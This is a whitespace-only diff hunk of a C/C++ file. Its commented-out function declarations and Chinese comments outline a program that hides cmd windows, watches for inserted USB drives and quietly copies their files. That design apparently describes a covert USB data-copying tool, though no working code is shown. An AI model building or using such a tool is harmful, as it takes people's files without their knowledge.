@@ -23,10 +23,10 @@ UINT DiskType;
 
 /*-------------------------------------------------------------------------------------------
 DWORD WINAPI hide(LPVOID);		//hide线程搜索cmd窗口，一旦发现即对其进行隐藏
-DWORD WINAPI stare(LPVOID);	//stare监视U盘，一旦退出active成false
-void copy(bool default_dest);	//处理默认"可移动磁盘",统一丢入file[0], 有名字的丢入file[i]
-bool checkusbname();	//同名的U盘不处理
-int checkusb();	//只能复制第一个插入的U盘
+DWORD WINAPI stare(LPVOID);		//stare监视U盘，一旦退出active成false
+void copy(bool default_dest);		//处理默认"可移动磁盘",统一丢入file[0], 有名字的丢入file[i]
+bool checkusbname();			//同名的U盘不处理
+int checkusb();				//只能复制第一个插入的U盘
 --------------------------------------------------------------------------------------------*/
 
 int main() {
